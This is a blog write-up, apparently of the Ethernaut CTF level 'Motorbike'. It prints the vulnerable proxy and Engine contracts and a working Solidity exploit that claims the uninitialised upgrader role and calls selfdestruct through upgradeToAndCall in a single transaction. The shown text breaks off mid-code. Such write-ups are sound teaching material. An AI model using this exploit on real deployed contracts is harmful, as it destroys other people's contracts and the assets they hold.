<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="https://0o3q.github.io/assets/css/syntax.css"><link rel="preconnect" href="https://cdnjs.cloudflare.com"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title> [Ethernaut] 25.Motorbike - 0o3q</title><link rel="shortcut icon" href="https://0o3q.github.io/favicon.png"><link rel="alternate" type="application/atom+xml" title="0o3q" href="https://0o3q.github.io/atom.xml"><link rel="alternate" type="application/json" title="0o3q" href="https://0o3q.github.io/feed.json" /><link rel="sitemap" type="application/xml" title="sitemap" href="https://0o3q.github.io/sitemap.xml" /><link rel="preconnect" href="https://fonts.gstatic.com"><link href="https://fonts.googleapis.com/css2?family=Play:wght@400;700&family=Source+Code+Pro:ital,wght@0,200;0,300;0,400;0,600;0,700;0,900;1,300;1,400;1,500;1,600;1,700;1,900&display=swap" rel="stylesheet"><style> *,:after,:before{box-sizing:border-box;background-color:inherit;color:inherit;margin:0;padding:0}html{font-size:15px}#theme-toggle{opacity:0.65;position:relative;border-radius:5px;height:25px;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;transition:opacity 0.3s ease 0s;border:none;outline:none;background:none;cursor:pointer;padding:0px;appearance:none;transform:scale(0.8)}html,html[data-theme="light"]{font-family:'CBNUJIKJI';--source-code-font: Source Code Pro;--very-light-text-color: rgb(222, 222, 222);--light-text-color: rgb(89, 183, 255);--medium-text-color: #555;--main-text-color: #333;--highlight-text-color: #6cb4a0;--dark-text-color: #393e46;--link-color: rgb(50, 87, 209);--code-bg-color: rgb(245, 245, 245);background-color:#fff}html #theme-toggle div,html[data-theme="light"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:none;background-color:var(--theme-ui-colors-transparent, transparent);transform:scale(1);transition:all 0.45s ease 0s;overflow:hidden;box-shadow:inset 8px -8px 0px 0px var(--theme-ui-colors-toggleIcon, #2d3748)}html #theme-toggle div::before,html[data-theme="light"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:none;border-radius:50%;transform:translate(0px, 0px);opacity:1;transition:transform 0.45s ease 0s}html #theme-toggle div::after,html[data-theme="light"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),0 23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),-23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748);transform:scale(0);transition:all 0.35s ease 0s}html[data-theme="dark"]{font-family:'CBNUJIKJI';--source-code-font: Source Code Pro;--very-light-text-color: #EEE;--light-text-color: #c4bbf0;--medium-text-color: #52057b;--main-text-color: #EAEAEA;--highlight-text-color: #6cb4a0;--dark-text-color: rgb(36, 38, 42);--link-color: rgb(255, 89, 125);--code-bg-color: rgb(36, 38, 42);background-color:#131418}html[data-theme="dark"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:4px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);background-color:var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(0.55);transition:all 0.45s ease 0s;overflow:visible;box-shadow:none}html[data-theme="dark"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:2px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);border-radius:50%;transform:translate(14px, -14px);opacity:0;transition:transform 0.45s ease 0s}html[data-theme="dark"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),0 23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(1);transition:all 0.35s ease 0s}body{font-family:var(--text-font),monospace;text-rendering:optimizeLegibility;line-height:1.75;color:var(--main-text-color)}a{color:var(--link-color);text-decoration:none}.post p{margin:1rem 0}.meta{margin:1.4rem 0}code,pre{background:var(--code-bg-color);margin:0 -27px;border-width:1px}code{font-family:var(--source-code-font),monospace;margin:unset;padding:0.1rem;color:var(--highlight-text-color)}pre code{background-color:unset;color:unset}pre{border-width:3px;padding:0.8rem;white-space:pre-wrap;border-style:none none none solid;border-color:var(--light-text-color)}img{max-width:100%}hr{background:var(--light-text-color);height:1px;border:0}header{flex-basis:10rem;flex-grow:1;position:relative}header a{text-decoration:none}header li{margin-bottom:0.2rem;text-align:right;margin-right:2rem}header a.active{font-weight:bold}header,section{padding:1rem 0}section{margin-top:5.5rem}blockquote{font-style:italic;border-left:5px solid var(--dark-text-color);padding-left:1rem}h1{color:var(--main-text-color);font-size:2rem;font-weight:bold;margin-bottom:1.5rem}h2,h3,h4,h5{font-weight:bold;margin-bottom:1.5rem;font-size:2rem}h2{font-size:1.8rem}h3{font-size:1.6rem}h4{font-size:1.4rem}h5{font-size:1.2rem}h6{font-size:1rem}section h1:first-child{margin-top:0}strong,b{font-weight:bold}.photos ul{list-style:none}.photos li{margin-bottom:1.5rem}.photo picture,.project picture{margin-bottom:0.5rem}.posts>h3{font-weight:500}.post ul{margin:0px;margin:0px 0px 10px 10px}.post ol{margin:0px;margin:0px 0px 10px 15px}.posts li{align-items:center;display:flex;justify-content:space-between;margin-bottom:0.5rem}.posts li a,.posts li div,.projects li a{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:bold}.posts li time,.projects li time{padding-left:1rem;white-space:nowrap;font-variant-numeric:tabular-nums}time{color:var(--main-text-color)}.post>h1.title{font-size:x-large;margin-top:0;margin-bottom:0}.post>time{margin-bottom:0;margin-top:3rem}.highlight{margin:0px}main{display:flex;max-width:47rem;margin:-5rem auto 0;padding:2.4rem 2rem;flex-direction:column}.flex-row-between{display:flex;flex-direction:row;justify-content:space-between}.social-footer{padding:1rem;display:flex;justify-content:center;position:initial}.social-footer .social-footer-icons .fa{font-size:1.3rem;color:#a9a9a9}.social-footer .social-footer-icons .fa:hover{color:dimgray;transition:color 0.3s ease-in}@media screen and (max-width: 45rem){header li{display:inline;margin-right:1rem}.logo{padding-bottom:1rem}header ul{border-bottom:1px solid #edf2f7;padding-bottom:2rem}nav ul{border-right:0px}.photos ul{margin-top:0.5rem}main{padding:0 2rem}}section{flex-grow:999;display:flex;flex-direction:column}figcaption{font-size:smaller}.bio{margin-bottom:5rem}::selection{background-color:#fffba0;color:#333}.search-article{position:relative}.search-article label[for="search-input"]{position:relative;top:-10px;left:11px}.search-article input[type="search"]{top:-1rem;left:0;border:0;width:100%;height:30px;outline:none;position:absolute;border-radius:5px;padding:10px 10px 10px 35px;color:var(--main-text-color);-webkit-appearance:none;background-color:rgba(128,128,128,0.1);border:1px solid rgba(128,128,128,0.1)}.search-article input[type="search"]::-webkit-input-placeholder{color:#808080}.search-article input[type="search"]::-webkit-search-decoration,.search-article input[type="search"]::-webkit-search-results-decoration{display:none}#search-results{text-align:center}#search-results li{text-align:center}#search-results li::before{content:"‚Ä∫";display:inline-block;margin-left:-1.3em;width:1.3em;color:var(--main-text-color)}.post-nav{display:flex;position:relative;margin-top:0;border-top:2px solid var(--light-text-color);line-height:1.4}.post-nav .post-nav-item{border-bottom:0;padding-bottom:10px;width:50%;padding-top:10px;text-decoration:none;box-sizing:border-box}.post-nav .post-nav-item .post-title{color:var(--main-text-color)}.post-nav .post-nav-item:hover .post-title,.post-nav .post-nav-item:focus .post-title{color:var(--link-color);opacity:0.9}.post-nav .post-nav-item .nav-arrow{font-size:17px;color:var(--main-text-color);margin-bottom:3px;font-weight:bold}.post-nav .post-nav-item:nth-child(odd){padding-left:0;padding-right:20px}.post-nav .post-nav-item:nth-child(even){text-align:right;padding-right:0;padding-left:20px}.tags ul{list-style:none;display:grid;grid-template-columns:auto auto auto auto auto auto;grid-template-rows:auto auto auto auto}.tags li{white-space:normal;text-overflow:ellipsis}.timeline{position:center;width:650px;margin:-6em auto;padding:1px;list-style-type:none}@media (max-width: 860px){.timeline{width:100%}}.timeline:before{position:absolute;left:50%;top:0;content:' ';display:block;width:6px;height:100%;margin-left:-3px;background:var(--light-text-color);z-index:5}@media (max-width: 375px){.timeline:before{height:150%}}.timeline li{padding:2em 0}@media (max-width: 860px){.timeline li{padding:2em 0}}.timeline li::after{content:"";display:block;height:150%;clear:both;visibility:hidden}.direction-l{position:relative;width:287px;float:left;text-align:right}@media (max-width: 860px){.direction-l{float:none;width:100%;text-align:center}}.direction-l .flag{color:#333;box-shadow:-1px 1px 1px rgba(0,0,0,0.52)}.direction-l .flag:after{content:"";position:absolute;left:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-left-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-l .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-l .time-wrapper{float:left}@media (max-width: 860px){.direction-l .time-wrapper{float:none}}.direction-r{position:relative;width:293px;float:right;text-align:left}@media (max-width: 860px){.direction-r{float:none;width:100%;text-align:center}}.direction-r .flag{color:#333;box-shadow:1px 1px 1px rgba(0,0,0,0.52)}.direction-r .flag:after{content:"";position:absolute;right:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-right-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-r .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-r .flag:before{left:-40px}.direction-r .time-wrapper{float:right}@media (max-width: 860px){.direction-r .time-wrapper{float:none}}.flag-wrapper{position:relative;display:inline-block;text-align:center}@media (max-width: 860px){.flag-wrapper{text-align:center}}.flag-wrapper .flag{position:relative;display:inline;background:#f8f8f8;padding:6px 10px;border-radius:5px;font-weight:600;text-align:left}@media (max-width: 860px){.flag-wrapper .flag{background:#fff;z-index:15}}.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:60%;right:-40px;content:' ';display:block;width:12px;height:12px;margin-top:-10px;background:#fff;border-radius:10px;border:4px solid var(--link-color);z-index:10}@media (max-width: 860px){.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:-30px;left:53%;content:' ';display:block;margin-left:-10px}}.time-wrapper{display:inline;line-height:1em;font-size:0.66666em;color:var(--link-color);vertical-align:middle}@media (max-width: 860px){.time-wrapper{display:block;position:relative;margin:4px 0 0 0;z-index:14}}.time-wrapper .time{display:inline-block;padding:4px 6px;background:#f8f8f8}.desc{margin:1em 0.2em -3.5em 0;font-size:0.9em;line-height:1.5em}.desc a{color:var(--link-color);text-decoration:none}.desc a:hover{text-decoration:underline}@media (max-width: 860px){.desc{position:relative;margin:1em 1em 0 1em;padding:1em;background:var(--code-bg-color);box-shadow:0 0 1px rgba(0,0,0,0.2);z-index:15}}.toc{position:absolute;right:0px;width:240px;overflow-y:auto;overflow-x:hidden;padding-right:0.75rem;padding-top:0.25rem;padding-bottom:0.25rem;margin-right:0px;border-left:2px solid #e0d9e7;display:none}@media (min-width: 75em){.toc{width:240px;display:block}}@media (min-width: 85em){.toc{width:300px;display:block}}@media (min-width: 95em){.toc{width:360px;display:block}}.toc a.toc-active{font-weight:bold;transition:all 0.125s ease-in 0s;font-size:0.75rem;color:#9075aa}.toc ul{list-style-type:none;margin-bottom:0.1rem;padding-left:0rem}.toc ul li{padding-left:.5rem}.toc a{text-decoration:none}</style></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-1YYNPDG09Q"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-1YYNPDG09Q'); </script><body><main><section class="post"><div class="flex-row-between"> <a href="https://0o3q.github.io">¬´ back</a> <button title="Change theme" id="theme-toggle" onclick="modeSwitcher()"><div></div></button></div><time datetime="2026-01-17T00:00:00+09:00">Jan 17, 2026 - 19 ' read</time><h1 class="title"> [Ethernaut] 25.Motorbike</h1><span class="meta"> <a href="https://0o3q.github.io/tag/blockchain">blockchain</a>, <a href="https://0o3q.github.io/tag/ethernaut">ethernaut</a>, <a href="https://0o3q.github.io/tag/foundry">foundry</a>, <a href="https://0o3q.github.io/tag/sellfdestruct">sellfdestruct</a>, <a href="https://0o3q.github.io/tag/delegatecall">delegatecall</a>, <a href="https://0o3q.github.io/tag/EIP-6780">EIP-6780</a>, <a href="https://0o3q.github.io/tag/EIP-7702">EIP-7702</a>, <a href="https://0o3q.github.io/tag/signAndAttachDelegation">signAndAttachDelegation</a>, <a href="https://0o3q.github.io/tag/computeCreateAddress">computeCreateAddress</a></span><article class="post-article"><div class="toc"><ul><li><a href="#analysis">Analysis</a></li><li><a href="#exploit">Exploit</a><ul><li><a href="#attempted-solution">Attempted Solution</a></li><li><a href="#deploying-the-assist-contract">Deploying the Assist Contract</a></li><li><a href="#delegating-to-the-sol-contract">Delegating to the Sol contract</a></li><li><a href="#obtaining-the-motorbike-and-engine-contract-addresses">Obtaining the Motorbike and Engine Contract addresses</a></li><li><a href="#executing-the-contract">Executing the Contract</a></li><li><a href="#complete-exploit-script">Complete Exploit Script</a></li><li><a href="#ethernaut-submission">Ethernaut Submission</a></li><li><a href="#revoking-the-delegation">Revoking the Delegation</a></li></ul></li></ul></div></article><h1 id="analysis"> Analysis <a href="#analysis">#</a></h1><hr /><p>The goal is ‚Äú<code class="language-plaintext highlighter-rouge">selfdestruct</code>¬†its engine and make the motorbike unusable‚Äù.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT
</span>
<span class="k">pragma</span> <span class="n">solidity</span> <span class="o">&lt;</span><span class="mf">0.7</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="s">"openzeppelin-contracts-06/utils/Address.sol"</span><span class="p">;</span>
<span class="k">import</span> <span class="s">"openzeppelin-contracts-06/proxy/Initializable.sol"</span><span class="p">;</span>

<span class="k">contract</span> <span class="n">Motorbike</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">AddressSlot</span> <span class="p">{</span>
        <span class="kt">address</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
</span>    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_logic</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">_logic</span><span class="p">),</span> <span class="s">"ERC1967: new implementation is not a contract"</span><span class="p">);</span>
        <span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="n">value</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">;</span>
        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">_logic</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"initialize()"</span><span class="p">));</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Call failed"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Delegates the current call to `implementation`.
</span>    <span class="k">function</span> <span class="n">_delegate</span><span class="p">(</span><span class="kt">address</span> <span class="n">implementation</span><span class="p">)</span> <span class="k">internal</span> <span class="k">virtual</span> <span class="p">{</span>
        <span class="c1">// solhint-disable-next-line no-inline-assembly
</span>        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">calldatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">calldatasize</span><span class="p">())</span>
            <span class="kr">let</span> <span class="n">result</span> <span class="o">:=</span> <span class="nb">delegatecall</span><span class="p">(</span><span class="n">gas</span><span class="p">(),</span> <span class="n">implementation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">calldatasize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
            <span class="n">returndatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span>
            <span class="kr">switch</span> <span class="n">result</span>
            <span class="kr">case</span> <span class="mi">0</span> <span class="p">{</span> <span class="nb">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span> <span class="p">}</span>
            <span class="kr">default</span> <span class="p">{</span> <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">returndatasize</span><span class="p">())</span> <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Fallback function that delegates calls to the address returned by `_implementation()`.
</span>    <span class="c1">// Will run if no other function in the contract matches the call data
</span>    <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">virtual</span> <span class="p">{</span>
        <span class="n">_delegate</span><span class="p">(</span><span class="n">_getAddressSlot</span><span class="p">(</span><span class="n">_IMPLEMENTATION_SLOT</span><span class="p">).</span><span class="n">value</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Returns an `AddressSlot` with member `value` located at `slot`.
</span>    <span class="k">function</span> <span class="n">_getAddressSlot</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">slot</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">slot</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">Engine</span> <span class="k">is</span> <span class="n">Initializable</span> <span class="p">{</span>
    <span class="c1">// keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
</span>    <span class="kt">bytes32</span> <span class="k">internal</span> <span class="k">constant</span> <span class="n">_IMPLEMENTATION_SLOT</span> <span class="o">=</span> <span class="mh">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="p">;</span>

    <span class="kt">address</span> <span class="k">public</span> <span class="n">upgrader</span><span class="p">;</span>
    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">horsePower</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">AddressSlot</span> <span class="p">{</span>
        <span class="kt">address</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="n">initialize</span><span class="p">()</span> <span class="k">external</span> <span class="n">initializer</span> <span class="p">{</span>
        <span class="n">horsePower</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
        <span class="n">upgrader</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Upgrade the implementation of the proxy to `newImplementation`
</span>    <span class="c1">// subsequently execute the function call
</span>    <span class="k">function</span> <span class="n">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
        <span class="n">_authorizeUpgrade</span><span class="p">();</span>
        <span class="n">_upgradeToAndCall</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Restrict to upgrader role
</span>    <span class="k">function</span> <span class="n">_authorizeUpgrade</span><span class="p">()</span> <span class="k">internal</span> <span class="k">view</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">upgrader</span><span class="p">,</span> <span class="s">"Can't upgrade"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
</span>    <span class="k">function</span> <span class="n">_upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="k">internal</span> <span class="p">{</span>
        <span class="c1">// Initial upgrade and setup call
</span>        <span class="n">_setImplementation</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">newImplementation</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Call failed"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Stores a new address in the EIP1967 implementation slot.
</span>    <span class="k">function</span> <span class="n">_setImplementation</span><span class="p">(</span><span class="kt">address</span> <span class="n">newImplementation</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">Address</span><span class="p">.</span><span class="n">isContract</span><span class="p">(</span><span class="n">newImplementation</span><span class="p">),</span> <span class="s">"ERC1967: new implementation is not a contract"</span><span class="p">);</span>

        <span class="n">AddressSlot</span> <span class="k">storage</span> <span class="n">r</span><span class="p">;</span>
        <span class="k">assembly</span> <span class="p">{</span>
            <span class="n">r_slot</span> <span class="o">:=</span> <span class="n">_IMPLEMENTATION_SLOT</span>
        <span class="p">}</span>
        <span class="n">r</span><span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="n">newImplementation</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><h1 id="exploit"> Exploit <a href="#exploit">#</a></h1><hr /><h2 id="attempted-solution"> Attempted Solution <a href="#attempted-solution">#</a></h2><p>The goal was to <code class="language-plaintext highlighter-rouge">selfdestruct</code> the Engine. Leveraging the fact that the Engine contract was uninitialized, I executed the Engine‚Äôs <code class="language-plaintext highlighter-rouge">initialize()</code> function to claim the <code class="language-plaintext highlighter-rouge">upgrader</code> role. Then, I invoked <code class="language-plaintext highlighter-rouge">upgradeToAndCall()</code> to trigger the self-destruct, but I was unable to solve the challenge.</p><p>To understand the solution requirements, I examined the Level instance code:</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="mh">0xd38def5b</span><span class="p">(</span><span class="kt">address</span> <span class="n">varg0</span><span class="p">,</span> <span class="kt">address</span> <span class="n">varg1</span><span class="p">)</span> <span class="k">public</span> <span class="n">nonPayable</span> <span class="p">{</span> 
    <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;=</span> <span class="mi">64</span><span class="p">);</span>
    <span class="k">return</span> <span class="kt">bool</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">_createInstance</span><span class="p">[</span><span class="n">varg0</span><span class="p">]).</span><span class="n">code</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>I found the <code class="language-plaintext highlighter-rouge">validateInstance()</code> function, which is executed when submitting the instance.</p><p><img src="https://0o3q.github.io/images/2026-01-17-Motorbike/etherscan.png" alt="Image etherscan" /> <img src="https://0o3q.github.io/images/2026-01-17-Motorbike/4bytes.png" alt="Image 4bytes" /></p><p>Checks if the Engine contract‚Äôs <code class="language-plaintext highlighter-rouge">code.size</code> is 0.</p><aside> üí° Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.</aside><p>This is the warning message displayed in Foundry when executing <code class="language-plaintext highlighter-rouge">selfdestruct</code>.</p><p>As indicated by the warning, there is an exception when the operation is executed within a transaction. I leveraged this exception to solve the challenge.</p><p>First, I deployed an Ex Contract containing a <code class="language-plaintext highlighter-rouge">selfdestruct</code> function to be delegated to the Engine. Exploiting the fact that the Engine Contract was uninitialized, I claimed the <code class="language-plaintext highlighter-rouge">upgrader</code> role. Finally, I used <code class="language-plaintext highlighter-rouge">upgradeToAndCall()</code> to delegate execution to the Ex Contract, triggering the <code class="language-plaintext highlighter-rouge">selfdestruct</code>.</p><h2 id="deploying-the-assist-contract"> Deploying the Assist Contract <a href="#deploying-the-assist-contract">#</a></h2><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">Ex</span> <span class="p">{</span>
    <span class="k">function</span> <span class="n">ex</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
        <span class="nb">selfdestruct</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">tx</span><span class="p">.</span><span class="n">origin</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">contract</span> <span class="n">Sol</span> <span class="p">{</span>

    <span class="k">function</span> <span class="n">solve</span><span class="p">(</span><span class="n">Ethernaut</span> <span class="n">ethernaut</span><span class="p">,</span> <span class="kt">address</span> <span class="n">level</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_eg</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
        <span class="n">ethernaut</span><span class="p">.</span><span class="n">createLevelInstance</span><span class="p">(</span><span class="n">Level</span><span class="p">(</span><span class="n">level</span><span class="p">));</span>
        <span class="n">Engine</span><span class="p">(</span><span class="n">_eg</span><span class="p">).</span><span class="n">initialize</span><span class="p">();</span>
        <span class="n">Engine</span><span class="p">(</span><span class="n">_eg</span><span class="p">).</span><span class="n">upgradeToAndCall</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">Ex</span><span class="p">()),</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"ex()"</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><p><code class="language-plaintext highlighter-rouge">ethernaut.createLevelInstance(Level(level))</code> is the function that runs when you click the ‚ÄúGet new instance‚Äù button on Ethernaut. You can check the full details <a href="https://sepolia.etherscan.io/address/0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6#code">here</a>.</p><div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">function</span> <span class="n">createLevelInstance</span><span class="p">(</span><span class="n">Level</span> <span class="n">_level</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
        <span class="c1">// Ensure level is registered.
</span>        <span class="nb">require</span><span class="p">(</span><span class="n">registeredLevels</span><span class="p">[</span><span class="kt">address</span><span class="p">(</span><span class="n">_level</span><span class="p">)],</span> <span class="s">"This level doesn't exists"</span><span class="p">);</span>

        <span class="c1">// Get level factory to create an instance.
</span>        <span class="kt">address</span> <span class="n">instance</span> <span class="o">=</span> <span class="n">_level</span><span class="p">.</span><span class="n">createInstance</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>

        <span class="c1">// Store emitted instance relationship with player and level.
</span>        <span class="n">emittedInstances</span><span class="p">[</span><span class="n">instance</span><span class="p">]</span> <span class="o">=</span> <span class="n">EmittedInstanceData</span><span class="p">(</span>
            <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span>
            <span class="n">_level</span><span class="p">,</span>
            <span class="nb">false</span>
        <span class="p">);</span>

